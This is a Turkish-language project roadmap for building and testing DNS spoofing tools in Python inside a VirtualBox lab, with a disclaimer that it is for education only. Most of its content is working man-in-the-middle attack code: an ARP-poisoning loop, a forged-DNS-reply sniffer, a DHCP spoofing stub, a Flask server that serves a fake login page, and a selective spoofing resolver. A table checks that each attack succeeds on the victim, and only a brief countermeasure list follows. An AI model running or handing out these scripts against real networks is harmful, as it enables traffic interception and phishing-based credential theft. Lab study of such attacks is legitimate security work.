#  ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme

##  Giriş

Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar.  
**Önemli Uyarı:** Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.

---



- **Python 3.x**
- **Kütüphaneler:**
  - `scapy`: Ağ manipülasyonu (→ `pip install scapy`)
  - `dnslib`: DNS sunucusu geliştirme (→ `pip install dnslib`)
  - `flask`: Sahte web sunucusu (→ `pip install flask`)
- **Gerekli Bilgi:**
  - Python temelleri
  - IP, ARP, DNS, DHCP protokolleri
  - Linux terminal kullanımı
- **Araçlar:** VirtualBox veya benzeri sanallaştırma yazılımı

---

##  Test Ortamını Kurma

1. **VirtualBox kurulumu**
2. **Sanal Makineler:**
   - Saldırgan VM: Kali Linux veya benzeri
   - Kurban VM: Windows / Linux
3. **Ağ yapılandırması:** Host-only ya da internal network kullanın

---

## Temel Bileşenlerin Geliştirilmesi

###  ARP Spoofing Betiği

```python
from scapy.all import *
import time

def get_mac(ip):
    ans, _ = arping(ip)
    for s, r in ans:
        return r[Ether].src

def arp_spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
        time.sleep(2)

arp_spoof("192.168.1.10", "192.168.1.1")
```
## DNS Spoofing Betiği
```
from scapy.all import *

def dns_spoof(packet):
    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
        spoofed_ip = "192.168.1.100"
        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                         UDP(dport=packet[UDP].sport, sport=53)/\
                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
        send(spoofed_packet, verbose=0)

sniff(filter="udp port 53", prn=dns_spoof)
```
##  DHCP Manipülasyon Betiği
```
from scapy.all import *

def dhcp_spoof(packet):
    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:
        fake_dns = "192.168.1.100"
        # Sahte yanıt oluşturulabilir, örnek yapı:
        # send(dhcp_offer)
        
sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)

```
## Sahte Web Sunucusu (Flask) Test amaçlı kullanmak için 
```
pip install flask
python
Kopyala
Düzenle
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('fake_login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

```
## Seçmeli DNS Spoofing (DNS Proxy)

```
from dnslib import *
from dnslib.server import DNSServer, BaseResolver

class SpoofResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        if qname in ['example.com.']:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
        return reply

resolver = SpoofResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()

```
## Entegre MITM Betiği
ARP + DNS Spoofing birleşik bir yapı haline getirilebilir.
Argüman desteği veya yapılandırma dosyası ile özelleştirilebilir.
## Test Yöntemleri
Özellik	Test Adımı
ARP Spoofing	arp -a ile ağ geçidinin MAC adresini kontrol edin
DNS Spoofing	nslookup example.com komutu sahte IP döndürmeli
DHCP Spoofing	ipconfig /renew sonrası DNS adresi değişmeli
Web Sunucusu	Kurban, sahte web sayfasını görüntüleyebilmeli

##  Karşı Önlemler
Statik ARP tabloları

DNSSEC kullanımı

HTTPS zorunluluğu

VPN veya segment izolasyonu

İzole test ağı kullanımı

